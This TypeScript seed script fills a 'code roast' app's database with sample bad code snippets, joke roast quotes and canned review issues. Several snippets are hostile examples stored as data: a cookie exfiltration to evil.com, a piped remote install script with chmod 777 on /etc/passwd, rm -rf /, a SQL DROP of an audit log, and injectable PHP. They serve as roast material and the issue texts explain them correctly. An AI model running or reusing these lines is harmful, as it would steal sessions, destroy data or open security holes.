import { config } from "dotenv"

config({ path: ".env.local" })

import { faker } from "@faker-js/faker"
import { drizzle } from "drizzle-orm/postgres-js"
import postgres from "postgres"

// ── Config ────────────────────────────────────────────────────────────────────

const client = postgres(process.env.DATABASE_URL!)
const db = drizzle(client, { casing: "snake_case" })

// ── Helpers ───────────────────────────────────────────────────────────────────

type RoastMode = "brutally_honest" | "full_roast"
type Verdict = "legendary" | "solid" | "needs_work" | "needs_serious_help"
type IssueSeverity = "critical" | "warning" | "good"

function scoreToVerdict(score: number): Verdict {
  if (score > 9) return "legendary"
  if (score > 7) return "solid"
  if (score >= 4) return "needs_work"
  return "needs_serious_help"
}

// ── Code snippets pool ────────────────────────────────────────────────────────

const CODE_SNIPPETS: { code: string; language: string }[] = [
  {
    language: "javascript",
    code: `eval(prompt('Enter code'));
document.write(fetch('http://evil.com/?d='+document.cookie))`,
  },
  {
    language: "javascript",
    code: `function add(a, b) {
  var result = 0;
  for (var i = 0; i < b; i++) {
    result = result + 1;
  }
  for (var i = 0; i < a; i++) {
    result = result + 1;
  }
  return result;
}`,
  },
  {
    language: "javascript",
    code: `var x = true;
if (x == true) {
  console.log("yes")
} else if (x == false) {
  console.log("no")
} else {
  console.log("maybe")
}`,
  },
  {
    language: "javascript",
    code: `function calculateTotal(items) {
  var total = 0;
  for (var i = 0; i < items.length; i++) {
    total = total + items[i].price;
  }
  if (total > 100) {
    console.log("discount applied");
    total = total * 0.9;
  }
  // TODO: handle tax
  return total
}`,
  },
  {
    language: "javascript",
    code: `async function getUser(id) {
  try {
    const res = await fetch('/api/user/' + id)
    const data = await res.json()
    return data
  } catch(e) {}
}`,
  },
  {
    language: "javascript",
    code: `function isEven(n) {
  if (n % 2 == 0) {
    return true
  } else {
    return false
  }
}`,
  },
  {
    language: "javascript",
    code: `const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

async function fetchData() {
  await sleep(2000)
  const a = await fetch('/api/a')
  await sleep(2000)
  const b = await fetch('/api/b')
  await sleep(2000)
  const c = await fetch('/api/c')
  return [a, b, c]
}`,
  },
  {
    language: "javascript",
    code: `window.onload = function() {
  document.getElementById('btn').onclick = function() {
    document.getElementById('result').innerHTML =
      document.getElementById('input').value * 2
  }
}`,
  },
  {
    language: "typescript",
    code: `function processData(data: any): any {
  const result: any = {}
  const keys: any[] = Object.keys(data as any)
  keys.forEach((k: any) => {
    result[k] = (data as any)[k]
  })
  return result as any
}`,
  },
  {
    language: "typescript",
    code: `interface User {
  name: String;
  age: Number;
  email: String;
  address: String;
  phone: String;
}

function greet(user: User): String {
  return "Hello, " + user.name + "!";
}`,
  },
  {
    language: "typescript",
    code: `class Singleton {
  private static instance: Singleton;
  public data: any = {};

  private constructor() {}

  public static getInstance(): Singleton {
    if (!Singleton.instance) {
      Singleton.instance = new Singleton();
    }
    return Singleton.instance;
  }

  public set(key: any, value: any) {
    this.data[key] = value;
  }

  public get(key: any) {
    return this.data[key];
  }
}`,
  },
  {
    language: "typescript",
    code: `type Status = "active" | "inactive" | "pending" | "deleted" | "banned" | "suspended"

function checkStatus(s: string) {
  if (s === "active") return true
  if (s === "inactive") return false
  if (s === "pending") return false
  if (s === "deleted") return false
  if (s === "banned") return false
  if (s === "suspended") return false
  return false
}`,
  },
  {
    language: "python",
    code: `def fibonacci(n):
    if n <= 0:
        return []
    elif n == 1:
        return [0]
    else:
        fib = [0, 1]
        for i in range(2, n):
            next_val = fib[i-1] + fib[i-2]
            fib.append(next_val)
        return fib

print(fibonacci(10))`,
  },
  {
    language: "python",
    code: `import os
import sys

password = "admin123"
db_host = "localhost"
db_user = "root"
db_pass = "password"

def connect():
    return f"mysql://{db_user}:{db_pass}@{db_host}/prod"`,
  },
  {
    language: "python",
    code: `l = [1,2,3,4,5,6,7,8,9,10]
r = []
for i in range(len(l)):
    if l[i] % 2 == 0:
        r.append(l[i] * l[i])
print(r)`,
  },
  {
    language: "python",
    code: `def divide(a, b):
    try:
        result = a / b
        return result
    except:
        pass`,
  },
  {
    language: "python",
    code: `class UserManager:
    users = []

    def add_user(self, name, email):
        self.users.append({"name": name, "email": email})

    def get_user(self, name):
        for u in self.users:
            if u["name"] == name:
                return u

    def delete_user(self, name):
        for i in range(len(self.users)):
            if self.users[i]["name"] == name:
                del self.users[i]
                break`,
  },
  {
    language: "sql",
    code: `SELECT * FROM users WHERE 1=1;
-- TODO: add authentication`,
  },
  {
    language: "sql",
    code: `SELECT * FROM orders o, users u, products p
WHERE o.user_id = u.id
AND o.product_id = p.id
AND u.country = 'BR'`,
  },
  {
    language: "sql",
    code: `DELETE FROM sessions;
DROP TABLE IF EXISTS audit_log;
UPDATE users SET password = NULL WHERE last_login < '2020-01-01';`,
  },
  {
    language: "sql",
    code: `SELECT id, name, email, phone, address, city, state, zipcode,
       created_at, updated_at, last_login, is_active, role, plan,
       balance, credits, referral_code
FROM users
WHERE is_active = true
ORDER BY created_at DESC`,
  },
  {
    language: "bash",
    code: `#!/bin/bash
rm -rf /
echo "cleanup done"`,
  },
  {
    language: "bash",
    code: `#!/bin/bash
# deploy script
cd /app
git pull
npm install
npm run build
pm2 restart all
echo "deployed at $(date)" >> deploy.log`,
  },
  {
    language: "bash",
    code: `curl http://example.com/install.sh | bash
sudo chmod 777 /etc/passwd
export API_KEY=sk-abc123secret
echo $API_KEY > /tmp/key.txt`,
  },
  {
    language: "go",
    code: `func divide(a, b int) int {
	result := a / b
	return result
}

func main() {
	fmt.Println(divide(10, 0))
}`,
  },
  {
    language: "go",
    code: `func fetchUsers() []User {
	rows, _ := db.Query("SELECT * FROM users")
	var users []User
	for rows.Next() {
		var u User
		rows.Scan(&u.ID, &u.Name, &u.Email)
		users = append(users, u)
	}
	return users
}`,
  },
  {
    language: "rust",
    code: `fn get_first(v: Vec<i32>) -> i32 {
    v[0]
}

fn main() {
    let nums: Vec<i32> = vec![];
    println!("{}", get_first(nums));
}`,
  },
  {
    language: "java",
    code: `public class Calculator {
    public static int add(int a, int b) {
        int result = 0;
        for (int i = 0; i < b; i++) {
            result++;
        }
        for (int i = 0; i < a; i++) {
            result++;
        }
        return result;
    }
}`,
  },
  {
    language: "java",
    code: `try {
    FileReader fr = new FileReader("data.txt");
    // read file
} catch (Exception e) {
    e.printStackTrace();
    // TODO: handle this properly
}`,
  },
  {
    language: "php",
    code: `<?php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = " . $id;
$result = mysql_query($sql);
$user = mysql_fetch_array($result);
echo $user['name'];`,
  },
  {
    language: "php",
    code: `<?php
$password = md5($_POST['password']);
if ($password == $stored_hash) {
    $_SESSION['logged_in'] = true;
    header('Location: dashboard.php');
}`,
  },
  {
    language: "css",
    code: `* {
  margin: 0 !important;
  padding: 0 !important;
  box-sizing: border-box !important;
}

.container {
  width: 100% !important;
  max-width: 1200px !important;
  margin: 0 auto !important;
}`,
  },
  {
    language: "html",
    code: `<div style="font-size: 24px; color: red; font-weight: bold;">
  <div style="margin-top: 10px; padding: 5px;">
    <div style="border: 1px solid black;">
      <p style="font-family: Arial;">Hello World</p>
    </div>
  </div>
</div>`,
  },
]

// ── Roast quotes pool ─────────────────────────────────────────────────────────

const CRITICAL_QUOTES = [
  "this code was written during a power outage… in 2005.",
  "i've seen better architecture in a collapsed building.",
  "this is what happens when Stack Overflow goes down for maintenance.",
  "somewhere, a rubber duck debugger just quit their job.",
  "i'd call this spaghetti code, but that would be an insult to pasta.",
  "this code is so bad, it could be used as a compiler test for error recovery.",
  "reading this felt like watching a train crash in slow motion — in Comic Sans.",
  "your git blame will be used as a cautionary tale in bootcamps.",
  "even ChatGPT would apologize before writing this.",
  "this is the kind of code that makes senior engineers retire early.",
  "if bugs were currency, you'd be a billionaire.",
  "the comments say TODO but the real TODO is 'rewrite everything'.",
  "i've seen ransomware with better structure than this.",
  "this function does everything except what it's supposed to.",
  "the garbage collector is filing a restraining order against you.",
]

const NEEDS_WORK_QUOTES = [
  "it works, but so does a car with three wheels — technically.",
  "this code has good bones. unfortunately the bones are broken.",
  "i've seen worse. once. in a museum of computing disasters.",
  "the intent is clear, the execution is a cry for help.",
  "not terrible, but definitely the reason code review exists.",
  "there's a good developer somewhere in here, buried under 12 layers of var.",
  "this is what 'get it working' looks like before 'get it right'.",
  "future you is already disappointed in present you.",
  "readable? no. functional? mostly. revisitable? dear lord, no.",
  "this code will work until it doesn't, and then nobody will know why.",
]

const SOLID_QUOTES = [
  "respectable. not exciting, but respectable.",
  "this code won't make anyone cry. that's a win.",
  "clean enough that I can almost forgive the one `any` in there.",
  "above average. the bar is low, but you cleared it.",
  "i've read worse in code that ships to production daily.",
  "no egregious sins. just a few venial ones.",
  "this is the code equivalent of a firm handshake.",
]

const LEGENDARY_QUOTES = [
  "i have nothing to roast. this is deeply unsatisfying.",
  "clean, idiomatic, well-structured. i hate it here.",
  "you clearly have read the docs. insufferable.",
  "this code makes me want to quit my job as an AI roaster.",
]

// ── Issues pool ───────────────────────────────────────────────────────────────

type IssueTemplate = { severity: IssueSeverity; title: string; description: string }

const CRITICAL_ISSUES: IssueTemplate[] = [
  {
    severity: "critical",
    title: "sql injection vulnerability",
    description:
      "user input is concatenated directly into sql queries. this allows attackers to read, modify, or delete your entire database. use parameterized queries or a prepared statement.",
  },
  {
    severity: "critical",
    title: "hardcoded credentials",
    description:
      "passwords and api keys are stored as plain strings in source code. anyone with repo access — or who finds your code on github — has full access to your systems.",
  },
  {
    severity: "critical",
    title: "swallowed exceptions",
    description:
      "errors are caught and silently ignored. when something breaks in production, you'll have zero visibility into what happened or why.",
  },
  {
    severity: "critical",
    title: "eval() with user input",
    description:
      "passing user-controlled data to eval() is arbitrary remote code execution waiting to happen. remove this immediately.",
  },
  {
    severity: "critical",
    title: "division by zero, unguarded",
    description:
      "there is no check that the divisor is non-zero before dividing. this will panic or throw at runtime when called with 0.",
  },
  {
    severity: "critical",
    title: "md5 for password hashing",
    description:
      "md5 is a checksum algorithm, not a password hash. it can be cracked with rainbow tables in seconds. use bcrypt, argon2, or scrypt.",
  },
  {
    severity: "critical",
    title: "unbounded array access",
    description:
      "accessing v[0] without checking if the vector is empty will panic at runtime. always guard index access or use .first()/.get().",
  },
  {
    severity: "critical",
    title: "rm -rf / in script",
    description:
      "this script will delete the entire root filesystem if run as root. there is no recovery from this. ever.",
  },
]

const WARNING_ISSUES: IssueTemplate[] = [
  {
    severity: "warning",
    title: "using var instead of const/let",
    description:
      "var is function-scoped and leads to hoisting bugs. use const by default, let when reassignment is needed.",
  },
  {
    severity: "warning",
    title: "overuse of any type",
    description:
      "casting everything to any defeats the purpose of typescript. define proper interfaces or use generics.",
  },
  {
    severity: "warning",
    title: "imperative loop instead of array methods",
    description:
      "for loops with manual indexing are verbose and error-prone. use .map(), .filter(), or .reduce() for cleaner, functional transformations.",
  },
  {
    severity: "warning",
    title: "sequential awaits that could be parallel",
    description:
      "awaiting each promise serially adds latency for no reason. use Promise.all() to run independent async operations concurrently.",
  },
  {
    severity: "warning",
    title: "SELECT * in production query",
    description:
      "selecting all columns wastes bandwidth, breaks when schema changes, and can accidentally expose sensitive fields. always list the columns you need.",
  },
  {
    severity: "warning",
    title: "mutable class-level state",
    description:
      "using a class variable (not instance variable) makes this shared across all instances. this is almost certainly not what you want.",
  },
  {
    severity: "warning",
    title: "magic numbers with no constants",
    description:
      "literal numbers scattered through the code have no context. extract them to named constants to make the intent clear.",
  },
  {
    severity: "warning",
    title: "missing error handling on fetch",
    description:
      "fetch() does not throw on HTTP error status codes. you need to check res.ok before parsing the response.",
  },
  {
    severity: "warning",
    title: "catching Exception too broadly",
    description:
      "catching the base Exception class hides programming errors alongside runtime errors. catch only the specific exceptions you expect.",
  },
  {
    severity: "warning",
    title: "implicit implicit implicit",
    description:
      "relying on implicit type coercion (== instead of ===) will burn you eventually. be explicit.",
  },
  {
    severity: "warning",
    title: "unnecessary intermediate variable",
    description:
      "the result variable is assigned and immediately returned. just return the expression directly.",
  },
  {
    severity: "warning",
    title: "redundant boolean comparison",
    description:
      "comparing a boolean to true or false is redundant. use the value directly as the condition.",
  },
  {
    severity: "warning",
    title: "inline styles instead of classes",
    description:
      "mixing presentation into html makes styles impossible to maintain or override. use css classes.",
  },
  {
    severity: "warning",
    title: "!important overuse",
    description:
      "sprinkling !important everywhere is a sign the cascade is broken. fix the specificity instead of overriding it with a sledgehammer.",
  },
]

const GOOD_ISSUES: IssueTemplate[] = [
  {
    severity: "good",
    title: "clear naming conventions",
    description:
      "variable and function names are descriptive and communicate intent without needing comments.",
  },
  {
    severity: "good",
    title: "single responsibility",
    description:
      "each function does one thing well — no side effects, no mixed concerns, no hidden complexity.",
  },
  {
    severity: "good",
    title: "consistent formatting",
    description: "indentation and spacing are consistent throughout. the code is easy to scan.",
  },
  {
    severity: "good",
    title: "early return pattern",
    description:
      "returning early on guard conditions avoids deep nesting and makes the happy path obvious.",
  },
  {
    severity: "good",
    title: "correct use of const",
    description: "immutable bindings are declared with const, signaling they won't be reassigned.",
  },
  {
    severity: "good",
    title: "destructuring used effectively",
    description: "object and array destructuring reduces verbosity and improves readability.",
  },
  {
    severity: "good",
    title: "async/await over callbacks",
    description:
      "using async/await instead of nested callbacks keeps the code linear and easy to follow.",
  },
]

// ── Issue generation ──────────────────────────────────────────────────────────

function pickRandom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function pickN<T>(arr: T[], n: number): T[] {
  const shuffled = [...arr].sort(() => Math.random() - 0.5)
  return shuffled.slice(0, Math.min(n, arr.length))
}

function generateIssues(score: number): IssueTemplate[] {
  const issues: IssueTemplate[] = []

  if (score < 4) {
    // critical zone: 2–3 criticals, 1–2 warnings, 1 good
    issues.push(...pickN(CRITICAL_ISSUES, faker.number.int({ min: 2, max: 3 })))
    issues.push(...pickN(WARNING_ISSUES, faker.number.int({ min: 1, max: 2 })))
    issues.push(...pickN(GOOD_ISSUES, 1))
  } else if (score < 7) {
    // needs_work: 0–1 critical, 2–3 warnings, 1–2 goods
    issues.push(...pickN(CRITICAL_ISSUES, faker.number.int({ min: 0, max: 1 })))
    issues.push(...pickN(WARNING_ISSUES, faker.number.int({ min: 2, max: 3 })))
    issues.push(...pickN(GOOD_ISSUES, faker.number.int({ min: 1, max: 2 })))
  } else if (score <= 9) {
    // solid: 0 criticals, 1 warning, 2–3 goods
    issues.push(...pickN(WARNING_ISSUES, 1))
    issues.push(...pickN(GOOD_ISSUES, faker.number.int({ min: 2, max: 3 })))
  } else {
    // legendary: 0 criticals, 0 warnings, 3–4 goods
    issues.push(...pickN(GOOD_ISSUES, faker.number.int({ min: 3, max: 4 })))
  }

  // dedupe by title and shuffle
  const seen = new Set<string>()
  return issues
    .filter((i) => {
      if (seen.has(i.title)) return false
      seen.add(i.title)
      return true
    })
    .sort(() => Math.random() - 0.5)
}

function generateRoastQuote(score: number): string {
  if (score < 4) return pickRandom(CRITICAL_QUOTES)
  if (score < 7) return pickRandom(NEEDS_WORK_QUOTES)
  if (score <= 9) return pickRandom(SOLID_QUOTES)
  return pickRandom(LEGENDARY_QUOTES)
}

// ── Seed data ─────────────────────────────────────────────────────────────────

// Score distribution weighted towards bad code (it's a roast app)
function generateScore(): number {
  const r = Math.random()
  if (r < 0.35) return faker.number.float({ min: 0.5, max: 3.9, fractionDigits: 1 })
  if (r < 0.65) return faker.number.float({ min: 4.0, max: 6.9, fractionDigits: 1 })
  if (r < 0.88) return faker.number.float({ min: 7.0, max: 8.9, fractionDigits: 1 })
  return faker.number.float({ min: 9.0, max: 10.0, fractionDigits: 1 })
}

// ── Main ──────────────────────────────────────────────────────────────────────

async function seed() {
  console.log("Cleaning existing data...")
  await client`DELETE FROM roast_issues`
  await client`DELETE FROM roasts`

  console.log("Seeding 100 roasts...")

  const TOTAL = 100

  for (let i = 0; i < TOTAL; i++) {
    const snippet = pickRandom(CODE_SNIPPETS)
    const score = generateScore()
    const verdict = scoreToVerdict(score)
    const mode: RoastMode = Math.random() > 0.4 ? "brutally_honest" : "full_roast"
    const lineCount = snippet.code.split("\n").length
    const createdAt = faker.date.between({
      from: new Date("2025-01-01"),
      to: new Date(),
    })

    const [roast] = await client`
      INSERT INTO roasts (code, language, line_count, mode, score, verdict, roast_quote, created_at)
      VALUES (
        ${snippet.code},
        ${snippet.language},
        ${lineCount},
        ${mode},
        ${score.toFixed(2)},
        ${verdict},
        ${generateRoastQuote(score)},
        ${createdAt.toISOString()}
      )
      RETURNING id
    `

    const issues = generateIssues(score)

    for (let j = 0; j < issues.length; j++) {
      const issue = issues[j]
      await client`
        INSERT INTO roast_issues (roast_id, severity, title, description, sort_order)
        VALUES (
          ${roast.id},
          ${issue.severity},
          ${issue.title},
          ${issue.description},
          ${j}
        )
      `
    }

    process.stdout.write(`\r  ${i + 1}/${TOTAL}`)
  }

  console.log("\nDone!")

  const [{ count }] = await client`SELECT COUNT(*) as count FROM roasts`
  const [{ issue_count }] = await client`SELECT COUNT(*) as issue_count FROM roast_issues`
  console.log(`  roasts:       ${count}`)
  console.log(`  roast_issues: ${issue_count}`)

  await client.end()
}

seed().catch((err) => {
  console.error(err)
  process.exit(1)
})
